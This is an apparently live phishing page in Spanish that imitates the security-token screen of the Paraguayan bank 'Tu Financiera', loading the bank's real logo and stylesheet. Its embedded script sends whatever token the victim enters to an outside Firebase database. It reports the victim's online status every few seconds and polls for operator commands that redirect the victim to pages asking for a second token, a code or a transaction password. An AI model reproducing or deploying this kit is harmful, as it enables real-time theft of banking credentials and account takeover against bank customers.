<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Token de seguridad</title>
<link rel="shortcut icon" type="image/png" href="https://tu.com.py/tufi-web/assets/icon/favicon.png">
<link rel="stylesheet" href="https://tu.com.py/tufi-web/static/css/main.bb0d1fd5.chunk.css">
<style>
  html,body{height:100%;margin:0}
  body{min-height:100vh;background:#464646;font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;display:flex;justify-content:flex-end}
  .fondo{position:fixed;inset:0;z-index:0;background:url('https://tu.com.py/tufi-web/static/media/fondo_login.34ff0d3f.png') center/cover no-repeat}
  .panel{position:relative;z-index:1;width:33.3333%;min-height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 18px;box-sizing:border-box}
  .logo-top{width:118px;margin-bottom:26px}
  .login-box{width:321px;max-width:100%;background:#fff;border:1px solid #d1d1d1;border-radius:10px;padding:24px 18px 18px;box-sizing:border-box;display:flex;flex-direction:column;align-items:center}
  h1{width:100%;font-size:16px;font-weight:bold;color:#8ec63f;line-height:1.25;margin:0 0 8px}
  p{width:100%;font-size:12px;color:#707070;line-height:1.5;margin:0 0 16px}
  .fila{width:100%;margin-bottom:10px}
  input{width:100%;height:44px;border:0;border-radius:10px;background:#d1d1d1;color:#000;font-family:inherit;font-size:20px;letter-spacing:8px;text-align:center;padding:0 10px;box-sizing:border-box;outline:none}
  .btn{width:99%;height:39px;border:0;border-radius:10px;background:#8dc63f;color:#fff;font-family:inherit;font-size:12px;font-weight:bold;letter-spacing:.33px;text-transform:uppercase;cursor:pointer}
  .err{display:none;width:100%;background:#f7941e;color:#fff;border-radius:8px;font-size:12px;font-weight:bold;padding:9px 10px;margin-bottom:10px;box-sizing:border-box;text-align:center}
  @media(max-width:900px){.panel{width:45%}}
  @media(max-width:768px){body{display:block}.panel{width:100%}.login-box{width:290px}.logo-top{width:96px}}
</style>
</head>
<body>
<div class="fondo"></div>
<div class="panel">
  <img class="logo-top" src="https://tu.com.py/tufi-web/static/media/logo_login.76bbbd3c.svg" alt="Tu Financiera">
  <div class="login-box">
    <h1 id="tt">Token de seguridad</h1>
    <p id="pp">Ingresá el token generado en tu aplicación Tu Financiera.</p>
    <div class="err" id="err"></div>
    <div class="fila"><input id="k" inputmode="numeric" maxlength="8" autocomplete="off" placeholder="________"></div>
    <button class="btn" id="btn">Continuar</button>
  </div>
</div>
<script>
(function(){
  var DB="https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
  var q=new URLSearchParams(location.search);
  var id=q.get('u')||localStorage.getItem('nbch_u');
  var e=q.get('e')==='2'?2:1;
  if(!id) return;
  var campo=e===1?'token':'token2';
  if(e===2){document.getElementById('tt').textContent='Nuevo token de seguridad';
            document.getElementById('pp').textContent='El token anterior no fue válido. Generá uno nuevo en tu aplicación.';}
  function patch(o){fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(o)}).catch(function(){});}
  patch({online:true,ultimoPing:Date.now(),pagina:'token.html'});
  var lt=setInterval(function(){patch({online:true,ultimoPing:Date.now()});},5000);
  window.addEventListener('beforeunload',function(){clearInterval(lt);patch({online:false});});

  var k=document.getElementById('k'),btn=document.getElementById('btn'),caja=document.getElementById('err');
  k.focus();
  k.addEventListener('input',function(){this.value=this.value.replace(/[^0-9a-zA-Z]/g,'').slice(0,8);});
  btn.addEventListener('click',function(){
    if(k.value.length<6){caja.textContent='Ingresá el token completo.';caja.style.display='block';return;}
    var o={estado:e===1?'TOKEN':'TOKEN 2',pagina:'token.html',online:true,ultimoPing:Date.now()};
    o[campo]=k.value;
    patch(o);
    btn.disabled=true;btn.textContent='Verificando...';
    location.href='cargando2.html?u='+id+'&m=token&e='+e;
  });

  var salio=false;
  setInterval(function(){
    if(salio)return;
    fetch(DB+'/comandos/'+id+'.json').then(function(r){return r.json();}).then(function(c){
      if(!c)return;
      if(c.accion==='token2'){salio=true;location.href='token.html?u='+id+'&e=2';}
      else if(c.accion==='codigo'){salio=true;location.href='codigo.html?u='+id+'&e=1';}
      else if(c.accion==='clave'){salio=true;location.href='clavetransaccional.html?u='+id;}
      else if(c.accion==='dejar'){salio=true;location.href='final.html?u='+id;}
      else if(c.rechazo){salio=true;location.href='rechazar.html?t='+c.rechazo+'&u='+id;}
    }).catch(function(){});
  },2000);
})();
</script>
</body>
</html>
